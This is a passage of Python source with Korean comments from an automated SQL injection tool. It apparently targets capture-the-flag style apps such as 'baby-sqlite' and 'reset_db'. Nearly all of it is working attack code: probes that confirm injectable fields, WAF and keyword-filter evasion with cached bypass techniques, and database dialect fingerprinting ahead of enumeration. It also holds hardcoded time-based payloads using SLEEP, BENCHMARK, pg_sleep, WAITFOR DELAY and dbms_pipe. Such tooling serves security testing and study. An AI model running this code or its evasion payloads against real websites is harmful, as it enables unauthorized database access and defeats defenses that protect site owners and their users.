        """이 응답이 '서버가 우리 페이로드를 거부/필터한 것'인지 판정한다 — 벤(recon가 학습)과
        WAF를 한 기준으로 통합한 단일 거부 판정.

          1) payload에 밴 토큰(recon filter_map)이 있으면 → 앱의 substring 필터가 SQL 실행 전에
             무조건 발동하므로 확실한 거부.
          2) 벤더 시그니처/rate-limit(classify_waf_block의 강한 판정)이면 → 확실한 WAF 차단.

        그 외(밴 토큰 없음 + 벤더 시그니처 아님)는 거부로 단정하지 '않는다'. 예전엔 제네릭 키워드
        ('hack' 등) 단독 매치를 길이 비교로 재검증했는데(1811 vs 1831 해킹), reset_db처럼 거부
        페이지가 성공/정상 페이지와 같은 앱에서는 성공 응답까지 '차단'으로 오인해 신호를 잃었다.
        밴은 filter_map으로 이미 정확히 알고, 진짜 인프라 WAF는 벤더 시그니처로 잡히므로, 애매한
        제네릭 판정은 무시하는 게 오탐이 적다(거부지문은 recon의 밴 학습에만 쓰고 여기선 안 쓴다 —
        reset_db는 거부==성공 페이지라 지문으로도 이 둘을 못 가르기 때문)."""
        if self._banned_in(surface, payload) is not None:
            return True
        blocked, name, _ = classify_waf_block(status, body)
        return bool(blocked and name and name != 'Unknown / Custom WAF')

    def _try_evade(self, surface, base_fields, payload: str, label: str, waf_hits: list, waf_evasions: list,
                    dialect: str | None = None, quiet: bool = False):
        """payload가 WAF에 막혔을 때 우회 변형들을 재시도한다.

        같은 필드·같은 payload_shape((surface.url, surface.param, shape))에서 최근에
        성공했던 기법이 있으면 그것 하나만 먼저 시도한다(요청 1개) — blind 추출처럼 같은
        모양의 페이로드를 수십~수백 번 보내는 구간에서, 매번 EVASION_TRANSFORMS 전체를
        재탐색하지 않아도 되게 하기 위함. shape까지 키에 포함시킨 이유는, boolean 단계에서
        통했던 기법(예: inline_comment)이 error/time처럼 구조가 다른 페이로드(SLEEP 서브쿼리
        등)엔 안 통할 수 있어서 — field 단위로만 캐싱하면 이런 경우 "캐시 시도 실패 → 결국
        전체 재탐색"이 되어 캐싱 효과가 없다.

        캐시된 기법이 실패하면(다른 필터 규칙에 걸린 경우) waf.try_evade로 전체를 다시
        훑되, 방금 실패한 그 기법은 skip으로 넘겨서 중복 시도를 피한다. 새로 찾은 기법으로
        캐시를 갱신한다 — 정확도는 기존과 동일하게 유지되고, 반복 상황에서만 빨라진다.

        dialect(blind 추출에서 확인된 DB 방언)는 waf.try_evade에 그대로 넘겨서, SQLite
        엔 안 통하는 substr_no_comma 같은 방언 전용 기법이 걸러지게 한다.
        """
        # payload에 밴 토큰(recon filter_map)이 있는데 우리 우회 변형 중 그 토큰을 실제로 없애는
        # 게 하나도 없으면(order/union/database 같은 키워드 substring 밴 — 공백/대소문자 변형으론
        # 못 지움), 우회는 무의미하니 요청을 낭비하지 않고 바로 실패 처리한다. 우회는 '구조적
        # WAF'(공백/키워드 경계 기반)용이지 키워드 밴용이 아니다 — 키워드 밴은 페이로드 자체를
        # 밴 없는 형태로 바꿔야(다음 단계) 뚫린다.
        banned = self._banned_in(surface, payload)
        if banned and not any(banned not in transform(payload).lower() for _, transform in EVASION_TRANSFORMS):
            if not quiet:
                print(f"    [Evade] {label}: 밴 토큰 {banned!r} 포함 — 우회 변형으로 못 없앰, 스킵(요청 아낌)")
            waf_hits.append(f"{label}(\"{payload}\") → 밴 토큰 {banned!r}, 우회 불가로 스킵")
            return None

        key = (surface.url, surface.param, self._payload_shape(label))
        cached_name = self._evasion_cache.get(key)
        tried_and_failed = None
        if cached_name:
            # apply_named_evasion은 단일 기법 이름('inline_comment')과 조합 이름
            # ('inline_comment+case_mix')을 둘 다 처리한다 — 캐시에 조합이 들어있어도
            # 여기서 못 알아보고 매번 전체 탐색으로 새는 일이 없다.
            variant = apply_named_evasion(cached_name, payload)
            if variant != payload:
                status, body, elapsed = self._send(surface, {**base_fields, surface.param: variant})
                if status is not None:
                    if not self._is_refused(surface, variant, status, body):
                        if not quiet:
                            print(f"    [Evade] {label}: {cached_name} 우회 성공(캐시)")
                        waf_evasions.append(f"{label}: {cached_name} 우회 성공(캐시) → \"{variant}\"")
                        return status, body, elapsed, variant
                tried_and_failed = cached_name

        # 이 shape의 캐시가 아직 비어있으면(=이 필드에서 이 shape로는 처음 차단당함),
        # scanner.py가 hidden_param 발견 당시 이미 확인해둔 우회 기법이 있는지 본다 —
        # discovery 당시 페이로드는 이 shape와 구조가 다를 수 있어 확실하지 않지만,
        # 요청 1개로 시도해볼 가치는 있다. 성공하면 이 shape의 정식 캐시에도 등록해서
        # 다음부터는 바로 캐시 히트로 처리된다. 실패해도 skip에 넣어 전체 탐색에서
        # 중복 시도만 피하고, 이후엔 이 필드에서 다시 안 쓴다(cached_name이 비어있을
        # 때만 도는 1회성 시도).
        if not cached_name:
            discovery_name = self._discovery_evasion_hint.get((surface.url, surface.param))
            if discovery_name and discovery_name != tried_and_failed:
                variant = apply_named_evasion(discovery_name, payload)
                if variant != payload:
                    status, body, elapsed = self._send(surface, {**base_fields, surface.param: variant})
                    if status is not None:
                        if not self._is_refused(surface, variant, status, body):
                            if not quiet:
                                print(f"    [Evade] {label}: {discovery_name} 우회 성공(발견 당시 기법)")
                            waf_evasions.append(f"{label}: {discovery_name} 우회 성공(발견 당시 기법) → \"{variant}\"")
                            self._evasion_cache[key] = discovery_name
                            return status, body, elapsed, variant
                    tried_and_failed = discovery_name

        result = try_evade(
            lambda variant: self._send(surface, {**base_fields, surface.param: variant}),
            payload, label, waf_hits, waf_evasions, dialect=dialect,
            skip={tried_and_failed} if tried_and_failed else None, quiet=quiet,
            is_banned=lambda v: self._banned_in(surface, v) is not None,
        )
        if result is None:
            return None
        status, body, elapsed, variant, name = result
        self._evasion_cache[key] = name
        return status, body, elapsed, variant

    def _send_evading(self, surface, base_fields, payload: str, label: str,
                       waf_hits: list, waf_evasions: list, timeout: int | None = None,
                       dialect: str | None = None, quiet: bool = False):
        """WAF 인지 전송 — 차단되면 자동으로 우회를 시도한다.

        모든 probe/공격벡터 확인 코드가 raw _send() 대신 이걸 쓰면, WAF 감지·우회·기록이
        한 곳에서 일관되게 처리된다.

        quiet=True면 우회 성공/실패의 [Evade] 개별 로그를 찍지 않는다 — waf_hits/waf_evasions
        기록은 그대로 남으니 나중에 필요하면 조회 가능하다. boolean 배치처럼 같은 종류의
        요청을 짧은 시간에 여럿 보낼 때, 호출부가 결과를 모아 한 줄로 요약해서 찍고 싶을 때
        쓴다.

        반환: (status, body, elapsed, 실제 사용된 payload, 우회했는지 여부).
        완전히 실패(요청 실패 또는 우회 전부 실패)하면 (None, '', 0.0, payload, False).
        """
        status, body, elapsed = self._send(surface, {**base_fields, surface.param: payload}, timeout=timeout)
        if status is None:
            return None, '', 0.0, payload, False

        # 벤(recon 학습)과 WAF를 한 기준으로 통합한 거부 판정 — 밴 토큰이거나 벤더 WAF일 때만
        # 거부로 본다(_is_refused 참고). 예전 길이 재분류 해킹은 여기서 제거됐다.
        if not self._is_refused(surface, payload, status, body):
            return status, body, elapsed, payload, False
        evaded = self._try_evade(surface, base_fields, payload, label, waf_hits, waf_evasions,
                                  dialect=dialect, quiet=quiet)
        if evaded is None:
            return None, '', 0.0, payload, False
        status, body, elapsed, used_payload = evaded
        return status, body, elapsed, used_payload, True

    # ── 요청 전송 ────────────────────────────────────────────────────────────

    def _base_fields(self, surface: AttackSurface) -> dict:
        """target 필드와 함께 보낼 나머지 필드의 기본값을 구성한다.

        profiler가 크롤링 시점의 실제 값(form input value 등)을 all_params에
        담아 넘겨주므로, 가능하면 'test' 더미 대신 그 값을 그대로 쓴다 —
        숫자형 필드에 대한 arithmetic 프로브가 여기에 의존한다.
        """
        if surface.surface_type == 'url_param':
            raw  = (surface.page or {}).get('params') or {}
            data = {k: (v[0] if isinstance(v, list) and v else 'test') for k, v in raw.items()}
        else:
            data = dict(surface.extra.get('all_params') or {})
        data.setdefault(surface.param, 'test')
        return data

    def _send(self, surface: AttackSurface, data: dict, timeout: int | None = None):
        """(status, body, elapsed) — 실패 시 (None, '', elapsed)."""
        timeout = timeout or self.TIMEOUT
        enctype = surface.extra.get('enctype') or ''
        start = time.monotonic()
        try:
            if surface.method == 'GET':
                resp = self.session.get(surface.url, params=data, timeout=timeout)
            elif 'application/json' in enctype:
                resp = self.session.request(surface.method, surface.url, json=data, timeout=timeout)
            else:
                resp = self.session.request(surface.method, surface.url, data=data, timeout=timeout)
            return resp.status_code, resp.text, time.monotonic() - start
        except Exception:
            return None, '', time.monotonic() - start

    def _extract_snippet(self, body: str, context: int = 200) -> str | None:
        """에러 시그니처 주변 텍스트를 추출한다 — 사람이 읽을 근거로 그대로 보여주기 위함."""
        lower = body.lower()
        for sigs in ERROR_SIGNATURES.values():
            for sig in sigs:
                idx = lower.find(sig)
                if idx != -1:
                    start = max(0, idx - 50)
                    end = min(len(body), idx + context)
                    return body[start:end].strip()
        return None

    # ── 0. 멱등성 프로브 (stateful 여부 + 노이즈 측정) ────────────────────────

    def _probe_idempotency(self, surface, base_fields, first_body: str) -> tuple[bool, int, list]:
        """이 엔드포인트가 stateful(요청마다 상태가 바뀜)인지, 그리고 페이지의 진짜 요청별
        변동폭(page_noise)을 판정한다.

        완전히 동일한 benign 요청(base_fields — 우리 입력을 바꾸지 않는다)을 IDEMPOTENCY_PROBES개
        '순차로' 보내(병렬은 상태 레이스로 측정을 오염시킨다) 첫 응답 대비 이후 응답들의 visible
        text diff를 잰다. 로그인 폼의 '틀린 로그인 N회 후 리셋/잠금'처럼 누적 상태가 있으면, 같은
        요청을 여러 번 보내는 것 자체가 그 카운터를 넘겨 응답이 도중에 바뀌는 걸로 드러난다 —
        그래서 2회(기존 노이즈 측정)로는 부족하고 카운터 임계값을 넘길 만큼 보낸다.

        page_noise(첫 응답 대비 최대 diff)가 STATEFUL_NOISE_THRESHOLD를 넘으면 stateful로 보고
        (호출부가 content 오라클을 끄고 시간 기반으로 전환), 안 넘으면 그 값을 이후 boolean/blind/
        ORDER BY 판정의 동적 임계값 바닥으로 그대로 쓴다(엔드포인트당 한 번만 재고 공유).

        결과는 (url, method)로 캐싱한다. first_body는 run()이 이미 받아둔 baseline 응답으로,
        첫 샘플로 재사용해 요청 1개를 아낀다. 반환: (stateful, page_noise, trace)."""
        key = (surface.url, surface.method)
        cached = self._idempotency.get(key)
        if cached is not None:
            return cached

        ref_text = visible_text(first_body)
        trace = []
        for _ in range(self.IDEMPOTENCY_PROBES - 1):
            status, body, _ = self._send(surface, dict(base_fields))
            text = visible_text(body) if status is not None else ref_text
            trace.append(diff_score(ref_text, text))
        page_noise = max(trace) if trace else 0
        stateful = page_noise > self.STATEFUL_NOISE_THRESHOLD
        verdict = 'stateful(비멱등) — content 오라클 신뢰 불가, 시간 기반 전환' if stateful else '멱등'
        print(f"    [Idem] {surface.method} {surface.url} 동일 요청 {self.IDEMPOTENCY_PROBES}회 — "
              f"diff trace={trace} → page_noise={page_noise} ({verdict})")
        result = (stateful, page_noise, trace)
        self._idempotency[key] = result
        return result

    # ── 1. Quote probe ───────────────────────────────────────────────────────

    def _probe_quote(self, surface, base_fields, baseline_status, baseline_body, quote_char, waf_hits: list, waf_evasions: list,
                      quote_signal: dict) -> dict | None:
        status, body, _, used_payload, waf_evaded = self._send_evading(
            surface, base_fields, quote_char, 'quote', waf_hits, waf_evasions,
        )
        if status is None:
            # quote_char 단독조차 우회 전부(단일 7종+조합) 실패 — 이후 quote_char를 담은
            # boolean/error-time 페이로드도 결과가 뻔하니 미리 알려서 스킵하게 한다.
            quote_signal['hopeless'] = True
            return None

        detected_db   = detect_db_from_error(body)
        error_in_body = detected_db is not None
        status_error  = status == 500 and baseline_status != 500
        print(f"    [Quote] quote=\"{used_payload}\" baseline={baseline_status} status={status} "
              f"error_in_body={error_in_body} detected={error_in_body or status_error}")

        if error_in_body or status_error:
            return {
                'type':            ('Error-based SQL Injection (Quote Probe)' if error_in_body
                                     else 'SQL Injection 의심 (미확정)'),
                'detected_db':     detected_db or 'Unknown',
                'payload':         used_payload,
                'baseline_status': baseline_status,
                'attack_status':   status,
                'evidence_kind':   'body' if error_in_body else 'status',
                'error_snippet':   self._extract_snippet(body) if error_in_body else None,
                'waf_evaded':      waf_evaded,
            }
        return None

    # ── 2. Arithmetic probe (숫자형 전용, WAF 우회) ──────────────────────────

    def _probe_arithmetic(self, surface, base_fields, baseline_body, original_value) -> dict | None:
        n = int(original_value)
        base_len = len(baseline_body)
        lens = {}
        for label, val in (('eq', f"{n + 1}-1"), ('neq', str(n + 1))):
            data = {**base_fields, surface.param: val}
            status, body, _ = self._send(surface, data)
            lens[label] = len(body) if status is not None else base_len

        eq_match    = abs(lens['eq'] - base_len) <= 10
        neq_differs = abs(lens['neq'] - base_len) > 30
        print(f"    [Arith] base={base_len} eq={lens['eq']} neq={lens['neq']} "
              f"detected={eq_match and neq_differs}")

        if eq_match and neq_differs:
            return {
                'type':             'Arithmetic-based SQL Injection',
                'detected_db':      'Unknown',
                'payload':          f"{n + 1}-1",
                'baseline_len':     base_len,
                'eq_response_len':  lens['eq'],
                'neq_response_len': lens['neq'],
            }
        return None

    def _probe_hidden_syntax_break(self, surface, base_fields, waf_hits: list, waf_evasions: list) -> dict | None:
        """hidden_param(퍼징으로 발견돼서 크롤링 시점의 실제 값을 본 적이 없는 필드) 전용 —
        _probe_arithmetic의 '원본 값과 비교' 방식은 원본 값을 모르니 못 쓴다(_base_fields가
        채우는 값은 실제 원본이 아니라 고정 문자열 'test').

        긍정 등가("A와 B가 산술적으로 같으니 응답도 같다")는 약한 증거다 — 파라미터가
        사실상 무시되거나 문자열로만 처리돼도 우연히 비슷한 응답이 나올 수 있어서 여러
        세계와 양립한다. 대신 괄호 짝을 이용한 문법 비대칭을 쓴다 — "짝이 맞으면 정상,
        깨면 에러, 다시 맞추면 정상"이라는 재현 가능한 패턴은 그 괄호를 실제 문법 단위로
        해석하는 파서(=SQL 엔진)가 있을 때만 나온다. 앱단이 숫자만 허용하는 자체 검증을
        하고 있다면 균형(valid)/불균형(broken) 값 전부 똑같이 튕겨나가서 이 패턴 자체가
        안 나오고, int()류 캐스팅도 괄호 문자를 특별 취급할 이유가 없어 마찬가지로 이
        패턴이 안 나온다 — 즉 이 판정 방식 자체가 "숫자만 걸러내는 검증"이나 "파라미터
        무시" 같은 오탐 원인을 자연스럽게 걸러낸다.

        base=9, bal1=(9), bal2=((9))는 균형이 맞아 baseline과 비슷해야 하고, broken1=9),
        broken2=(9는 불균형이라 baseline과 달라야 한다 — 이 두 조건이 동시에 성립할 때만
        숫자형 SQL 파싱으로 1차 판정한다. 노이즈 기준은 이번 세션에서 boolean/blind/
        ORDER BY에 적용한 것과 동일하게 페이지 자체의 요청별 흔들림을 재서 동적으로 잡는다.

        1차 판정만으로 확정하지 않고, broken1을 한 번 더 보내 같은 결과가 재현되는지
        확인한 뒤에만 최종 확정한다 — 우연한 노이즈로 인한 오탐을 배제하기 위한 재현성
        체크다(_probe_boolean의 재검증과 같은 원칙).
        """
        noise_texts = []
        for _ in range(2):
            status, body, _ = self._send(surface, {**base_fields, surface.param: 'A' * 10})
            noise_texts.append(visible_text(body) if status is not None else '')
        page_noise = diff_score(noise_texts[0], noise_texts[1])
        # boolean/blind/ORDER BY와 달리 바닥값을 5가 아니라 1로 낮게 잡는다 — 이 probe는
        # hidden_param 전용이라, "숨겨진 파라미터에 값을 넣었더니 반응이 달라졌다"는 것 자체가
        # 이미 그 파라미터가 뭔가에 실제로 쓰이고 있다는 강한 사전 신호다(존재 자체를 몰랐던
        # 필드니까). "Good!"/"Bad!"처럼 응답 전체가 몇 글자 안 되는 페이지에서는 진짜 SQL
        # 에러가 나도 diff가 1~4에 그칠 수 있는데(실측: diff_score("Good!","Bad!")=3), 5라는
        # 바닥값은 이런 짧은 응답 자체를 통째로 못 잡을 만큼 높다. noise가 0으로 실측(완전
        # 결정적 페이지로 확인)됐을 때 5라는 임의의 안전마진을 얹을 근거도 약하다.
        noise_threshold = max(page_noise * 2, 1)

        values = {'base': '9', 'bal1': '(9)', 'bal2': '((9))', 'broken1': '9)', 'broken2': '(9'}
        texts = {}
        for label, val in values.items():
            status, body, _, _, _ = self._send_evading(
                surface, base_fields, val, f'hidden-syntax({label})', waf_hits, waf_evasions,
            )
            texts[label] = visible_text(body) if status is not None else None
        if any(t is None for t in texts.values()):
            print(f"    [Syntax] hidden 필드 괄호 짝 판별 실패 — 요청 실패 또는 WAF 우회 전부 실패")
            return None

        diffs = {label: diff_score(texts['base'], texts[label])
                 for label in ('bal1', 'bal2', 'broken1', 'broken2')}
        # balanced_ok가 <=(이하)라 threshold와 같은 diff도 '정상'으로 받아주는 것과 대칭을
        # 맞추려면 broken_signal도 >=(이상)여야 한다 — diff가 정확히 threshold와 같은
        # 경계 케이스를 "신호 없음"으로 놓치지 않기 위함(실측 사례: noise=0, threshold=1
        # 상황에서 broken diff가 정확히 1로 나온 적 있음).
        balanced_ok   = diffs['bal1'] <= noise_threshold and diffs['bal2'] <= noise_threshold
        broken_signal = diffs['broken1'] >= noise_threshold and diffs['broken2'] >= noise_threshold
        print(f"    [Syntax] hidden 필드 괄호 짝 판별: noise={page_noise} threshold={noise_threshold} "
              f"diffs={diffs} → balanced_ok={balanced_ok} broken_signal={broken_signal}")
        if not (balanced_ok and broken_signal):
            return None

        status, retry_body, _, _, _ = self._send_evading(
            surface, base_fields, values['broken1'], 'hidden-syntax(broken1-verify)', waf_hits, waf_evasions,
        )
        if status is None:
            print(f"    [Syntax] 재현성 확인 요청 실패 — 신뢰 불가")
            return None
        retry_diff = diff_score(texts['base'], visible_text(retry_body))
        reproduced = retry_diff >= noise_threshold  # 1차 판정과 같은 기준(>=)으로 맞춤
        print(f"    [Syntax] 재현성 확인: broken1 재전송 diff={retry_diff} → "
              f"{'재현됨(확정)' if reproduced else '재현 안 됨(오탐 의심), 판별 취소'}")
        if not reproduced:
            return None

        return {
            'type':             'Arithmetic-based SQL Injection (Syntax Break)',
            'detected_db':      'Unknown',
            'payload':          values['broken1'],
            'noise_threshold':  noise_threshold,
            'balanced_diffs':   {k: diffs[k] for k in ('bal1', 'bal2')},
            'broken_diffs':     {k: diffs[k] for k in ('broken1', 'broken2')},
            'retry_diff':       retry_diff,
        }

    def _probe_numeric_comment(self, surface, base_fields, injection_prefix: str, vuln_entry: dict,
                                waf_hits: list, waf_evasions: list) -> tuple[str, int | None, str | None]:
        """숫자형/산술 경로(_probe_arithmetic/_probe_hidden_syntax_break)로 확정된 필드에서
        이후 열거 페이로드에 쓸 comment를 정하고, 동시에 '진짜 정상' 기준 응답도 확보해서
        돌려준다.

        두 확정 방식 다 comment를 전혀 안 쓴 페이로드로 성공했다 — 즉 인젝션 지점 뒤에는
        원래 아무것도 안 남는다는 뜻이다(예: level={level}이 쿼리의 끝). 이 사실을 이용해서
        SQL_DIALECTS의 version_fn(순수 표현식이라 comment 불필요)을 comment 없이 그대로
        값 자리에 꽂아 dialect를 판별한다 — 방언이 맞으면 함수가 정상 실행돼 '정상' 기준
        텍스트와 비슷하게 나오고, 틀리면 없는 함수라 에러가 나서 '에러' 기준 텍스트와
        비슷하게 나온다(_bool_oracle과 같은 '더 가까운 쪽' 판정 원리).

        판별에 성공하면 comment가 필요 없다는 것도 같이 증명된 셈이라 ''를 쓰고,
        vuln_entry['detected_db']도 채워서 _blind_extract_boolean의 _resolve_dialect가
        재프로빙 없이 재사용하게 한다. 판별에 실패하면(기준 응답 자체가 안 갈리거나, 3개
        방언 다 에러 쪽에 가까움) 안전한 기본값(--, SQLite/MySQL/PostgreSQL 공통)으로
        폴백한다 — #는 MySQL 전용이라 다른 방언에서 그 자체가 구문 오류를 낼 수 있다.

        여기서 확보하는 '정상' 기준 응답(injection_prefix 단독 전송 결과)은 run()이
        _go_enumerate의 baseline으로도 재사용한다 — run() 맨 처음에 캡처한 baseline_body는
        원본 값을 모르는 hidden 필드라 placeholder('test')로 받은 건데, level 같은 숫자형
        컬럼에 따옴표 없이 그대로 꽂히는 필드에서는 'test'가 문자열이 아니라 존재하지 않는
        컬럼 참조로 파싱돼서 그 자체가 에러 응답일 수 있다(baby-sqlite에서 실제로 확인됨:
        level=test → "no such column: test" → 앱이 잡아서 "Error!" 반환). 이런 필드에서
        stale한 placeholder 기반 baseline과 비교하면 판정이 통째로 뒤집힌다(정상 응답이
        baseline과 달라서 '깨졌다'고, 진짜 깨진 응답이 baseline과 같아서 '정상'이라고
        오판) — 그래서 injection_prefix 단독 응답(확실히 유효한 값)을 새 baseline으로 쓴다.
        """
        ref_ok_status, ref_ok_body, _, _, _ = self._send_evading(
            surface, base_fields, injection_prefix, 'enum(dialect-ref-ok)', waf_hits, waf_evasions,
        )
        ref_err_status, ref_err_body, _, _, _ = self._send_evading(
            surface, base_fields, f"{injection_prefix})", 'enum(dialect-ref-error)', waf_hits, waf_evasions,
        )
        if ref_ok_status is None or ref_err_status is None:
            print(f"    [Enum] dialect 판별용 기준 응답 확보 실패 — comment 기본값('-- ')으로 폴백, "
                  f"baseline도 기존 것 유지")
            return '-- ', ref_ok_status, ref_ok_body
        ref_ok_text, ref_err_text = visible_text(ref_ok_body), visible_text(ref_err_body)
        if diff_score(ref_ok_text, ref_err_text) < 1:
            print(f"    [Enum] 정상/에러 기준 응답이 구분 안 됨 — dialect 판별 불가, comment 기본값('-- ')으로 폴백")
            return '-- ', ref_ok_status, ref_ok_body

        for dialect in DIALECT_PROBE_ORDER:
            version_fn = SQL_DIALECTS[dialect]['version_fn']
            status, body, _, _, _ = self._send_evading(
                surface, base_fields, version_fn, f'enum(dialect-probe:{dialect})', waf_hits, waf_evasions,
            )
            if status is None:
                continue
            text = visible_text(body)
            looks_ok = diff_score(text, ref_ok_text) <= diff_score(text, ref_err_text)
            print(f"    [Enum] dialect 후보={dialect} payload=\"{version_fn}\" → "
                  f"{'정상(일치 가능성)' if looks_ok else '에러(불일치)'}")
            if looks_ok:
                vuln_entry['detected_db'] = dialect
                print(f"    [Enum] dialect 확정: {dialect} — comment 불필요(인젝션 지점 뒤에 "
                      f"남는 게 없음으로 이미 확인됨), comment=''")
                return '', ref_ok_status, ref_ok_body

        print(f"    [Enum] dialect 판별 실패(어느 방언도 안 맞음) — comment 기본값('-- ')으로 폴백")
        return '-- ', ref_ok_status, ref_ok_body

    # ── 3. Error/Time 순차 체인 (DB별) ───────────────────────────────────────

    @staticmethod
    def _db_payloads(quote_char: str) -> list[tuple[str, str]]:
        q = quote_char
        return [
            # SLEEP/BENCHMARK를 OR/AND로 그냥 붙이거나 (SELECT SLEEP(5)) 같은 맨 스칼라 서브쿼리로
            # 넣으면 WHERE가 스캔하는 행마다 반복 평가돼 지연이 행 수만큼 곱해진다(실측: 9.86s→
            # 50.44s ~5배; 맨 스칼라로 바꿨다가 N배 지연으로 타임아웃 재현됨). 그래서 파생 테이블
            # 서브쿼리 (SELECT ...)x로 감싸 옵티마이저가 딱 한 번만 materialize하게 한다.
            #
            # 동시에 '무행(side-effect-free)'이어야 한다 — 바깥을 SELECT 0으로 하면 서브쿼리 값이
            # 0 → 'OR 0'이라 행을 반환하지 않는다. 로그인 폼 WHERE에 행이 반환되면 앱이 로그인
            # 성공으로 처리하거나 더블체크/리셋/잠금/로깅 같은 부작용을 내는데(실측: reset_db는
            # 인젝션이 행을 반환할 때마다 admin 비번 리셋), 지연만 목적인 SLEEP/BENCHMARK는 값을
            # SELECT 0으로 버려 무행으로 만든다 — 예전 SELECT 1은 행을 반환해 이 부작용이 있었다.
            ('MySQL_OR',   f"{q} OR (SELECT 0 FROM (SELECT SLEEP(5))x) #"),
            ('MySQL_AND',  f"{q} AND (SELECT 0 FROM (SELECT SLEEP(5))x) #"),
            # SLEEP이 밴리스트(SLEEP 키워드 자체를 막는 필터)에 걸려 위 둘 다 실패했을 때만
            # 순서상 자연스럽게 시도되는 폴백. BENCHMARK는 SLEEP과 문법이 겹치지 않는 MySQL
            # 전용 CPU 반복 연산 함수라 SLEEP 금지어 필터를 우회한다. 다만 걸리는 시간이
            # 고정 지연이 아니라 서버 CPU 속도/부하에 좌우돼 SLEEP보다 불안정하므로, SLEEP이
            # 통하면 항상 SLEEP을 우선시키고 이건 최후 수단으로만 쓴다. 여기도 위와 같은
            # 이유로 파생 테이블(run-once) + SELECT 0(무행).
            ('MySQL_OR_BENCHMARK',  f"{q} OR (SELECT 0 FROM (SELECT BENCHMARK(20000000,MD5(NOW())))x) #"),
            ('MySQL_AND_BENCHMARK', f"{q} AND (SELECT 0 FROM (SELECT BENCHMARK(20000000,MD5(NOW())))x) #"),
            ('PostgreSQL', f"{q}; SELECT pg_sleep(5) --"),
            # WAITFOR DELAY의 시간 리터럴, dbms_pipe의 채널명은 T-SQL/PL-SQL 자체 문법이라
            # breaking 문자와 무관하게 항상 홑따옴표를 쓴다.
            ('MSSQL',      f"{q}; WAITFOR DELAY '0:0:5' --"),
            ('Oracle',     f"{q} AND 1=dbms_pipe.receive_message('RDS', 5) --"),
        ]

    def _probe_error_time(self, surface, base_fields, baseline_status, baseline_elapsed, quote_char, waf_hits: list, waf_evasions: list,
                           quote_signal: dict, known_dialect: str | None = None) -> dict | None:
        # status만 바뀌는 약한 신호를 만나도 즉시 확정하지 않고, 남은 DB 페이로드에서
        # 본문 증거나 time-based 확정을 더 찾아본다 — 끝까지 없으면 이걸 최후 수단으로 반환.
        fallback = None

        # recon이 에러 시그니처로 이미 DB를 확인해뒀으면(surface.extra['detected_db'])
        # 그 DB 계열 페이로드만 시도한다 — 안 그러면 이미 아는 걸 무시하고 5개 DB를 매번
        # blind로 다시 찔러보게 된다. db_name이 'MySQL_OR'/'MySQL_AND'처럼 같은 DB의 여러
        # 구조 변형일 수 있어서, 이름이 known_dialect로 '시작'하는 항목을 전부 남긴다(한
        # 구조만 시도하면 그 구조가 우연히 안 통할 때 확정을 놓칠 수 있어서). known_dialect가
        # 없거나 _db_payloads에 매칭되는 항목이 아예 없으면(예: SQLite — 아래 목록엔 항목
        # 자체가 없음) 기존처럼 전체를 순회한다.
        db_payloads = self._db_payloads(quote_char)
        if known_dialect:
            filtered = [(name, p) for name, p in db_payloads if name.startswith(known_dialect)]
            if filtered:
                skipped = len(db_payloads) - len(filtered)
                print(f"    [ET] 이미 확인된 DB({known_dialect}) 페이로드만 시도 — 나머지 {skipped}개 스킵")
                db_payloads = filtered

        # boolean과 같은 원칙 — quote_signal['hopeless']가 이미 True(quote probe/boolean 둘 중
        # 하나라도 실패 확인)여도, error/time은 자기 구조(SLEEP 서브쿼리 등)로 첫 quote 포함
        # 페이로드를 반드시 한 번 직접 시도해본다. '그것도' 실패했을 때만(기존 증거 + 이 단계
        # 자체 확인, 두 증거가 겹칠 때만) 이후 quote 포함 DB 페이로드를 스킵한다.
        time_quote_hopeless = False
        for db_name, payload in db_payloads:
            contains_quote = quote_char in payload
            if contains_quote and time_quote_hopeless:
                print(f"    [ET] db={db_name} — \"{quote_char}\" 우회 불가 이 단계에서 이미 확인됨, 스킵")
                continue

            status, body, elapsed, used_payload, waf_evaded = self._send_evading(
                surface, base_fields, payload, f'error/time({db_name})', waf_hits, waf_evasions,
                timeout=self.TIME_TIMEOUT,
            )
            if status is None:
                print(f"    [ET] db={db_name} 요청 실패/타임아웃 또는 WAF 우회 실패 → 다음 DB로")
                if contains_quote and not time_quote_hopeless and quote_signal['hopeless']:
                    time_quote_hopeless = True
                    print(f"    [ET] \"{quote_char}\" 포함 첫 페이로드 우회 실패(quote probe/boolean도 "
                          f"실패) — 이후 이 단계의 \"{quote_char}\" 포함 DB 페이로드는 스킵")
                continue

            detected_db    = detect_db_from_error(body)
            error_in_body  = detected_db is not None
            status_error   = status == 500 and baseline_status != 500
            time_detected  = elapsed >= (baseline_elapsed + 4.5)
            print(f"    [ET] db={db_name} status={status} error={error_in_body} "
                  f"time={elapsed:.2f}s(base={baseline_elapsed:.2f}s)")

            if error_in_body:
                return {
                    'type':            'Error-based SQL Injection',
                    'detected_db':     detected_db,
                    'payload':         used_payload,
                    'baseline_status': baseline_status,
                    'attack_status':   status,
                    'evidence_kind':   'body',
                    'error_snippet':   self._extract_snippet(body),
                    'waf_evaded':      waf_evaded,
                }
            elif status_error and fallback is None:
                fallback = {
                    'type':            'SQL Injection 의심 (미확정)',
                    'detected_db':     db_name,
                    'payload':         used_payload,
                    'baseline_status': baseline_status,
                    'attack_status':   status,
                    'evidence_kind':   'status',
                    'error_snippet':   None,
                    'waf_evaded':      waf_evaded,
                }

            if time_detected:
                # 1차 교차검증 — 페이로드 없는 baseline 재요청도 느리면 서버 전역 렉으로
                # 보고 다음 DB로 넘어간다.
                v_status, _, v_elapsed = self._send(surface, dict(base_fields), timeout=self.TIMEOUT)
                if v_status is None or v_elapsed >= baseline_elapsed + 2.0:
                    print(f"    [ET] db={db_name} 검증 요청도 느림 → 서버 렉, 다음 DB로")
                    continue

                # 2차 재현성 확인 — baseline이 빨랐다는 것만으로는 "이 페이로드가 원인"이란
                # 증거가 안 된다. 취약점과 무관한 필드에서도 인프라/네트워크의 단발성 지연이
                # 우연히 딱 한 번 걸릴 수 있고(실측: 무관한 필드에서 baseline 대비 3배 가까운
                # 우연한 스파이크가 관측됨), 그 직후의 baseline 재요청은 원인이 뭐였든 자연스레
                # 빠르게 나오므로 1차 검증만으로는 우연과 진짜 SQLi를 구분 못 한다. 같은 공격
                # 페이로드를 한 번 더 보내서 지연이 재현되는지까지 확인해야 확정할 수 있다.
                r_status, _, r_elapsed, _, _ = self._send_evading(
                    surface, base_fields, payload, f'error/time({db_name},verify)', waf_hits, waf_evasions,
                    timeout=self.TIME_TIMEOUT,
                )
                reproduced = r_status is not None and r_elapsed >= (baseline_elapsed + 4.5)
